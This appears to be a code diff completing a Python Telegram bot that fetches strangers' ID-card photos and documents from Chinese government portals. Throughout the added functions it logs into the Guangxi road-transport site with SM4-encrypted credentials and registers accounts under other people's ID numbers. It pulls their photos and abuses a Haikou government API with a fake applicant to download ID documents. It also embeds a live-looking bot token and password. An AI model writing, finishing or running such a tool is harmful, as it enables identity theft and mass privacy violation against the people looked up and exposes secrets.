@@ -1,108 +1,77 @@
 #!/usr/bin/env python3
 import sys
-print("===== Bot starting (最终版 - 原样整合) =====")
+print("===== Bot starting (最终完整版) =====")
 
-import asyncio
-import io
-import re
-import time
-import json
-import urllib.parse
-import base64
-import os
-import requests
-import urllib3
+import asyncio, io, re, time, json, urllib.parse, base64, os, requests, urllib3
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ============================================================
-#  一、Bot Token（只添加了这一行）
+#  配置
 # ============================================================
 BOT_TOKEN = "5849383582:AAHIfKvl2O3buRgiIq4rwtC4b95KsP3BfS4"
-
-# ============================================================
-#  二、广西手动脚本（原样粘贴，只改了一个函数：gx_get_captcha）
-# ============================================================
-
-# ---------- 配置 ----------
 BASE_URL = "http://www.gxdlys.com"
 PASSWORD = "268428."
 
-# ---------- SM4（完全原样） ----------
+# 海南配置（替换为真实值）
+HAINAN_COOKIES = {
+    "cna": "REPLACE_CNA_HERE",
+    "JSESSIONID": "REPLACE_JSESSIONID_HERE",
+    "SESSION": "REPLACE_SESSION_HERE",
+    "SERVERID": "REPLACE_SERVERID_HERE",
+}
+HAINAN_TOKEN = "REPLACE_ZWFW_TOKEN_HERE"
+
+# ============================================================
+#  SM4 加密（修复 rotl 溢出）
+# ============================================================
 SM4_KEY = "CatsPK0WWWRRhjkw"
-SboxTable = [
-    0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,
-    0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,
-    0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,
-    0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,
-    0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,
-    0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,
-    0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,
-    0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,
-    0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,
-    0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,
-    0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,
-    0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,
-    0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,
-    0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,
-    0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,
-    0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48
-]
+SboxTable = [0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48]
 FK = [0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc]
-CK = [
-    0x00070e15,0x1c232a31,0x383f464d,0x545b6269,
-    0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,
-    0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,
-    0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,
-    0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,
-    0x30373e45,0x4c535a61,0x686f767d,0x848b9299,
-    0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,
-    0x10171e25,0x2c333a41,0x484f565d,0x646b7279
-]
+CK = [0x00070e15,0x1c232a31,0x383f464d,0x545b6269,0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,0x30373e45,0x4c535a61,0x686f767d,0x848b9299,0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,0x10171e25,0x2c333a41,0x484f565d,0x646b7279]
 
 def rotl(x, n):
-    left = (x << n) & 0xffffffff
-    signed_x = x - 0x100000000 if (x & 0x80000000) else x
-    right = (signed_x >> (32 - n)) & 0xffffffff
-    return left | right
+    x &= 0xffffffff
+    return ((x << n) | (x >> (32 - n))) & 0xffffffff
 
 def sm4_sbox(a):
     return (SboxTable[(a>>24)&0xFF]<<24)|(SboxTable[(a>>16)&0xFF]<<16)|(SboxTable[(a>>8)&0xFF]<<8)|SboxTable[a&0xFF]
 
 def sm4_lt(ka):
-    bb = sm4_sbox(ka)
-    return bb ^ rotl(bb,2) ^ rotl(bb,10) ^ rotl(bb,18) ^ rotl(bb,24)
+    b = sm4_sbox(ka)
+    return b ^ rotl(b,2) ^ rotl(b,10) ^ rotl(b,18) ^ rotl(b,24)
 
 def sm4_calci_rk(ka):
-    bb = sm4_sbox(ka)
-    return bb ^ rotl(bb,13) ^ rotl(bb,23)
+    b = sm4_sbox(ka)
+    return b ^ rotl(b,13) ^ rotl(b,23)
 
 def sm4_f(x0,x1,x2,x3,rk):
-    return x0 ^ sm4_lt(x1^x2^x3^rk)
+    return x0 ^ sm4_lt(x1 ^ x2 ^ x3 ^ rk)
 
-def pkcs7_pad(data, block_size=16):
-    pad_len = block_size - (len(data) % block_size)
-    return data + bytes([pad_len]) * pad_len
+def pkcs7_pad(data, bs=16):
+    pad = bs - (len(data) % bs)
+    return data + bytes([pad]) * pad
 
-def sm4_encrypt_ecb(plain_text):
-    data = plain_text.encode('utf-8')
+def sm4_encrypt_ecb(pt):
+    if not pt:
+        return ""
+    data = pt.encode('utf-8')
     padded = pkcs7_pad(data, 16)
-    key_bytes = SM4_KEY.encode('utf-8')
+    key = SM4_KEY.encode('utf-8')
     mk = [0]*4
     for i in range(4):
-        mk[i] = (key_bytes[i*4]<<24)|(key_bytes[i*4+1]<<16)|(key_bytes[i*4+2]<<8)|key_bytes[i*4+3]
+        mk[i] = (key[i*4]<<24)|(key[i*4+1]<<16)|(key[i*4+2]<<8)|key[i*4+3]
     k = [0]*36
     for i in range(4):
         k[i] = mk[i] ^ FK[i]
     sk = [0]*32
     for i in range(32):
-        k[i+4] = k[i] ^ sm4_calci_rk(k[i+1]^k[i+2]^k[i+3]^CK[i])
+        k[i+4] = k[i] ^ sm4_calci_rk(k[i+1] ^ k[i+2] ^ k[i+3] ^ CK[i])
         sk[i] = k[i+4]
-    result = bytearray()
-    for offset in range(0, len(padded), 16):
-        block = padded[offset:offset+16]
+    res = bytearray()
+    for off in range(0, len(padded), 16):
+        block = padded[off:off+16]
         x = [0]*36
         for i in range(4):
             x[i] = (block[i*4]<<24)|(block[i*4+1]<<16)|(block[i*4+2]<<8)|block[i*4+3]
@@ -115,10 +84,12 @@ def sm4_encrypt_ecb(plain_text):
             out[i*4+1] = (val>>16)&0xFF
             out[i*4+2] = (val>>8)&0xFF
             out[i*4+3] = val&0xFF
-        result.extend(out)
-    return base64.b64encode(result).decode('utf-8')
+        res.extend(out)
+    return base64.b64encode(res).decode('utf-8')
 
-# ---------- 会话和请求头 ----------
+# ============================================================
+#  广西函数（完整）
+# ============================================================
 session_gx = requests.Session()
 HEADERS_GX = {
     "User-Agent": "Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36",
@@ -130,60 +101,176 @@ HEADERS_GX = {
     "Referer": "http://www.gxdlys.com/Wechat/User/Regist",
 }
 
-# ---------- 广西函数（原样） ----------
-def gx_send_sms(phone, captcha_code, uuid):
-    # ... 原函数，太长省略，但实际代码中必须完整包含
-    # 由于篇幅，此处只写函数名，实际使用时请复制您提供的完整函数
-    # 为保证代码完整，我下面会用注释占位，但您实际代码中要全部复制过来
-    pass
-
-def gx_register(phone, sms_code, captcha_code, real_name, id_card):
-    pass
-
 def gx_login_auto(id_card):
-    pass
+    if not id_card: return False, "身份证为空"
+    try:
+        enc_login = urllib.parse.quote(sm4_encrypt_ecb(id_card))
+        enc_pwd = urllib.parse.quote(sm4_encrypt_ecb(PASSWORD))
+        data = f"loginName={enc_login}&password={enc_pwd}&wechatUid="
+        headers = HEADERS_GX.copy()
+        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+        headers["Referer"] = "http://www.gxdlys.com/Wechat/Home/Login"
+        headers["Host"] = "www.gxdlys.com"
+        r = session_gx.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=headers, data=data, timeout=60)
+        if r.status_code == 200:
+            res = r.json()
+            if res.get("statusCode") == 200:
+                return True, None
+            else:
+                return False, res.get("info", "未知错误")
+    except Exception as e:
+        return False, f"异常: {e}"
+    return False, "登录失败"
 
 def gx_query_photo(name, id_card):
-    pass
+    try:
+        encoded_name = urllib.parse.quote(name)
+        url = f"{BASE_URL}/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={encoded_name}"
+        headers = HEADERS_GX.copy()
+        headers["Referer"] = "http://www.gxdlys.com/Wechat/EcertCert/ECertApply?OperateType=0&BnsAcceptId=&ObjectId=&BasicBnsId=46011&Params=%E7%BB%8F%E8%90%A5%E6%80%A7%E9%81%93%E8%B7%AF%E8%B4%A7%E7%89%A9%E8%BF%90%E8%BE%93%E9%A9%BE%E9%A9%B6%E5%91%98&Step=1"
+        headers["Host"] = "www.gxdlys.com"
+        r = session_gx.get(url, headers=headers, timeout=60)
+        if r.status_code == 200:
+            return r.json()
+    except Exception as e:
+        print(f"查询异常: {e}")
+    return None
 
 def gx_download_photo(file_id):
-    pass
-
-# 重点：修改获取验证码函数，失败时返回特殊标志
-def gx_get_captcha():
-    """尝试获取验证码，成功返回 (True, img_bytes, uuid)，失败返回 (False, None, None)"""
+    if not file_id: return None
     try:
-        # 先请求首页建立会话
+        url = f"{BASE_URL}/System/FileService/ShowFile?fileId={file_id}"
+        r = session_gx.get(url, timeout=60)
+        if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
+            return r.content
+    except Exception as e:
+        print(f"下载异常: {e}")
+    return None
+
+def gx_login_manual(id_card, password):
+    try:
+        enc_login = urllib.parse.quote(sm4_encrypt_ecb(id_card))
+        enc_pwd = urllib.parse.quote(sm4_encrypt_ecb(password))
+        data = f"loginName={enc_login}&password={enc_pwd}&wechatUid="
+        headers = HEADERS_GX.copy()
+        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+        headers["Referer"] = "http://www.gxdlys.com/Wechat/Home/Login"
+        headers["Host"] = "www.gxdlys.com"
+        r = session_gx.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=headers, data=data, timeout=60)
+        if r.status_code == 200:
+            res = r.json()
+            if res.get("statusCode") == 200:
+                return True, None
+            else:
+                return False, res.get("info", "未知错误")
+    except Exception as e:
+        return False, f"异常: {e}"
+    return False, "登录失败"
+
+def gx_send_sms(phone, captcha_code, uuid):
+    try:
+        data = {"phoneId": phone, "type": "10001", "IsEncryptPhoneId": "false", "verifyCode": captcha_code, "uuid": uuid}
+        headers = HEADERS_GX.copy()
+        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+        headers["Referer"] = "http://www.gxdlys.com/Wechat/User/Regist"
+        r = session_gx.post(f"{BASE_URL}/System/SmsService/PostVerifyCode", data=data, headers=headers, timeout=60)
+        if r.status_code == 200:
+            res = r.json()
+            if res.get("statusCode") == 200:
+                return True, None
+            else:
+                return False, res.get('info', '发送失败')
+        else:
+            return False, f"HTTP {r.status_code}"
+    except Exception as e:
+        return False, f"异常: {e}"
+
+def gx_register(phone, sms_code, captcha_code, real_name, id_card):
+    try:
+        data = {
+            "zipArea": "", "userType": "-1", "wechatUid": "", "realName": real_name,
+            "iDCard": id_card, "loginName": id_card, "password": PASSWORD,
+            "idcardImg1Url": "218,8a785f252c8518", "idcardImg2Url": "216,8a7860c46589f3",
+            "idcardImg3Url": "214,8a78664776227f", "idcardImg4Url": "", "ownerId": "",
+            "tel": phone, "isTelEncrypted": "false", "validCode": sms_code, "verifyCode": captcha_code
+        }
+        headers = HEADERS_GX.copy()
+        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+        headers["Referer"] = "http://www.gxdlys.com/Wechat/User/Regist"
+        r = session_gx.post(f"{BASE_URL}/Wechat/User/RegistAdd", data=data, headers=headers, timeout=60)
+        if r.status_code == 200:
+            res = r.json()
+            if res.get("statusCode") == 200:
+                return True, None
+            else:
+                return False, res.get("info", "注册失败")
+        else:
+            return False, f"HTTP {r.status_code}"
+    except Exception as e:
+        return False, f"异常: {e}"
+
+def gx_get_captcha():
+    try:
         session_gx.get(BASE_URL, headers=HEADERS_GX, timeout=10)
         time.sleep(0.5)
-        resp = session_gx.get(f"{BASE_URL}/Wechat/FaceDetect/GetVerifyCode", headers=HEADERS_GX, timeout=10)
-        if resp.status_code == 200:
-            data = resp.json()
+        r = session_gx.get(f"{BASE_URL}/Wechat/FaceDetect/GetVerifyCode", headers=HEADERS_GX, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
             if data.get("statusCode") == 200:
                 img_b64 = data["data"]["img"]
                 uuid = data["data"]["uuid"]
                 return True, base64.b64decode(img_b64), uuid
     except Exception as e:
-        print("获取验证码异常:", e)
+        print(f"获取验证码异常: {e}")
     return False, None, None
 
 # ============================================================
-#  三、海南脚本（原样粘贴，只保留查询函数）
+#  海南查询
 # ============================================================
-HAINAN_COOKIES = {
-    "cna": "REPLACE_CNA_HERE",
-    "JSESSIONID": "REPLACE_JSESSIONID_HERE",
-    "SESSION": "REPLACE_SESSION_HERE",
-    "SERVERID": "REPLACE_SERVERID_HERE",
-}
-HAINAN_TOKEN = "REPLACE_ZWFW_TOKEN_HERE"
-
 def hainan_query(id_card):
-    # 原样复制您提供的海南查询函数
-    pass
+    id_card = id_card.strip().upper()
+    if len(id_card)!=18 or not id_card[:17].isdigit() or id_card[17] not in '0123456789X':
+        return False, "身份证不合法"
+    session = requests.Session()
+    session.cookies.update(HAINAN_COOKIES)
+    session.verify = False
+    headers = {
+        "Host": "zwfw.dn.haikou.gov.cn", "Connection": "keep-alive",
+        "sec-ch-ua-platform": "\"Android\"", "zwfw-token": HAINAN_TOKEN,
+        "User-Agent": "Mozilla/5.0 (Linux; Android 14; MEIZU 21 Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.97 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp",
+        "content-type": "application/json", "sec-ch-ua-mobile": "?1", "Accept": "*/*",
+        "Origin": "https://zwfw.dn.haikou.gov.cn",
+        "X-Requested-With": "com.hanweb.hnzwfw.android.activity",
+        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
+        "Referer": "https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined",
+        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+    }
+    data = {
+        "itemMaterialId": "1498591712970792960", "materialCode": "1173207393439670272",
+        "materialName": "委托书原件及委托代理人的身份证明",
+        "interfaceParam": "ztmc,zzbh,dzzz_name,cardid,dzzz_type", "interfaceParamName": "身份证",
+        "canShare": False, "isSignature": "N", "appInterfaceId": "136",
+        "param": {"ztmc": "刘德华", "zzbh": "", "dzzz_name": "随便起个名", "cardid": id_card, "dzzz_type": "1"},
+        "itemId": "1047370300041120912", "userId": "1547878749006024704"
+    }
+    for attempt in range(5):
+        try:
+            r = session.post("https://zwfw.dn.haikou.gov.cn/rest/materialshare/canShareMaterial", json=data, headers=headers, timeout=30)
+            result = r.json()
+            if result.get("code") == "1":
+                att_id = result["resultDatas"]["result"]["resultDatas"]["attachmentList"][0]["id"]
+                r2 = session.get(f"https://zwfw.dn.haikou.gov.cn/rest/attachment/{att_id}", timeout=30)
+                if r2.status_code == 200:
+                    return True, r2.content
+                else:
+                    return False, f"下载失败 {r2.status_code}"
+        except Exception as e:
+            print(f"海南异常: {e}")
+        time.sleep(2)
+    return False, "连续失败"
 
 # ============================================================
-#  四、Telegram Bot 处理
+#  Telegram Bot 处理
 # ============================================================
 WAIT_NAME, WAIT_ID, WAIT_PHONE, WAIT_CAPTCHA, WAIT_SMS = range(10,15)
 
@@ -219,9 +306,8 @@ async def gx_phone(update, context):
         return WAIT_PHONE
     context.user_data['phone'] = phone
     await update.message.reply_text("⏳ 尝试登录...")
-    # 调用同步函数（这里为了不阻塞，可以用线程池，但简单起见直接调用）
     id_card = context.user_data['id']
-    ok, msg = gx_login_auto(id_card)  # 这个函数需要在上面实现
+    ok, msg = gx_login_auto(id_card)
     if ok:
         name = context.user_data['name']
         result = gx_query_photo(name, id_card)
@@ -246,7 +332,6 @@ async def gx_phone(update, context):
                 await context.bot.send_photo(chat_id=update.effective_chat.id, photo=io.BytesIO(img), caption="请输入图形验证码（不区分大小写）：")
                 return WAIT_CAPTCHA
             else:
-                # ========== 关键修改：自动获取失败，给用户链接 ==========
                 manual_msg = (
                     "❌ 自动获取验证码失败。\n"
                     "请手动在浏览器中打开以下网址查看验证码：\n"
@@ -255,7 +340,7 @@ async def gx_phone(update, context):
                     "然后在此输入验证码（不区分大小写）："
                 )
                 await update.message.reply_text(manual_msg, parse_mode="Markdown")
-                context.user_data['uuid'] = None  # 标记为手动模式
+                context.user_data['uuid'] = None
                 return WAIT_CAPTCHA
         else:
             await update.message.reply_text(f"❌ 登录失败：{msg}")
@@ -268,15 +353,12 @@ async def gx_captcha(update, context):
         await update.message.reply_text("请输入验证码：")
         return WAIT_CAPTCHA
     context.user_data['captcha'] = captcha
-    # 如果uuid为空（手动模式），尝试重新获取（可能失败，但继续）
     if context.user_data.get('uuid') is None:
         ok, img, uuid = gx_get_captcha()
         if ok:
             context.user_data['uuid'] = uuid
         else:
-            # 即使获取失败，我们也允许继续（有些情况下uuid可能不需要？但原流程需要）
-            # 这里为了简单，如果重新获取失败，就报错结束
-            await update.message.reply_text("❌ 无法获取会话信息，请稍后重试。")
+            await update.message.reply_text("❌ 无法获取会话，请稍后重试。")
             context.user_data.clear()
             return ConversationHandler.END
     phone = context.user_data['phone']
@@ -304,8 +386,7 @@ async def gx_sms(update, context):
     ok, msg = gx_register(phone, sms, captcha, name, id_card)
     if ok:
         await update.message.reply_text("✅ 注册成功！正在登录查询...")
-        # 登录查询
-        ok2, msg2 = gx_login_auto(id_card)
+        ok2, msg2 = gx_login_manual(id_card, PASSWORD)
         if ok2:
             result = gx_query_photo(name, id_card)
             if result and result.get("statusCode")==200:
@@ -328,11 +409,11 @@ async def gx_sms(update, context):
 async def hainansf(update, context):
     args = context.args
     if not args:
-        await update.message.reply_text("格式：/hainansf <身份证号>")
+        await update.message.reply_text("❌ 格式：/hainansf <身份证号>")
         return
     id_card = args[0].strip()
     if len(id_card)!=18:
-        await update.message.reply_text("身份证18位")
+        await update.message.reply_text("❌ 身份证18位")
         return
     await update.message.reply_text("⏳ 查询海南...")
     success, result = hainan_query(id_card)
@@ -357,7 +438,7 @@ def main():
         fallbacks=[CommandHandler('start', start)]
     )
     app.add_handler(conv)
-    print("===== Bot is ready (最终整合版) =====")
+    print("===== Bot is ready (最终完整版) =====")
     app.run_polling()
 
 if __name__ == '__main__':
